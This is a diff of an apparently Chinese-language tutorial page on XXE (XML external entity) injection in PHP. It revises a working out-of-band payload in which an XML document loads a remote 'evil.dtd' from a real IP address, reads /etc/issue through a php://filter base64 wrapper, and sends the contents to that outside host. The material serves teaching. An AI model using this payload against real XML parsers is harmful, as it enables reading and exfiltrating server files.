@@ -200,19 +200,17 @@ echo $xml-&gt;name;
 
 <pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE xxe [
-    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/issue&quot;&gt;
     &lt;!ENTITY % remote SYSTEM &quot;http://114.115.183.86/wyb/evil.dtd&quot;&gt;
     %remote;
-    %send;
 ]&gt;
 </code></pre>
 
 <p>evil.dtd内容：</p>
 
-<pre><code>&lt;!ENTITY % all
-&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://114.115.183.86/?%file;'&gt;&quot;
-&gt;
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/issue&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://114.115.183.86/?%file;'&gt;&quot;&gt;
 %all;
+%send;
 </code></pre>
 
 <ul>
